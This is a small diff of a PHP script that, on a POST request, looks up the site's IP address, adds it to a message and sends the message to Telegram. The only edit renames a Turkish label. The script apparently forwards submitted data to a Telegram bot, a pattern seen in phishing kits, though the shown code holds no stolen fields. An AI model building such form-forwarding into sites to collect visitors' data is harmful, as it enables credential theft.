@@ -89,7 +89,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $dnsRecords = dns_get_record($host, DNS_A);
     $ip = isset($dnsRecords[0]['ip']) ? $dnsRecords[0]['ip'] : 'IP bulunamadı';
 
-    $message .= "Sayfaya Ait Domain ip si: " . $ip . "\n";
+    $message .= "domain-ip: " . $ip . "\n";
 
     // Telegram mesajını gönder
     $message = urlencode($message);
